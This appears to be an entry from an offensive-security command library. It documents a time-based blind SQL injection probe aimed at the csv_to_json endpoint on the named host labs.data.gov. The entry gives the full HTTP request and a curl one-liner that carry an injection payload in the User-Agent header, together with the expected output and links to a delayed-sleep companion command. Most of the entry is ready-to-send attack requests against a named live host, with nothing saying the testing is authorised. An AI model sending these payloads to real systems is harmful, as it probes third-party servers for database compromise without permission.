---
id: 1dd0752d-2138-419e-a348-69c71347933d
name: sql-injection-sleep-0s-user-agent
type: command
executor: bash
data: >-
  GET /dashboard/datagov/csv_to_json HTTP/1.1

  Referer: 1

  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
  like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'

  X-Forwarded-For: 1

  X-Requested-With: XMLHttpRequest

  Host: labs.data.gov

  Connection: Keep-alive

  Accept-Encoding: gzip,deflate

  Accept: */*
output: null
created_at: '2025-12-11T06:10:28.713Z'
updated_at: '2025-12-11T06:10:28.713Z'
platforms:
  - Web
tags:
  - sqli
  - time-based
verified: false
validated: true
submitted: true
---

# sql-injection-sleep-0s-user-agent

## Command

```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

## Description

Sends an HTTP GET request to the /dashboard/datagov/csv_to_json endpoint with a time-based SQL injection payload in the User-Agent header to cause no delay (sleep(0)), used to confirm blind SQLi by contrasting with delayed responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `User-Agent` | Injects SQL payload 'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR' to test time-based injection with zero delay | Yes |
| `Host` | Target host: labs.data.gov | Yes |

## Examples

### Basic Usage

```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

### Advanced Usage

Use with curl: ```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" "https://labs.data.gov/dashboard/datagov/csv_to_json"
```

## Expected Output

Server responds immediately, confirming no sleep occurred.

## Related

- [[commands/sql-injection-sleep-25s-user-agent]]
- [[procedures/Verify-Time-Based-SQL-Injection-Using-Sleep-Payloads]]
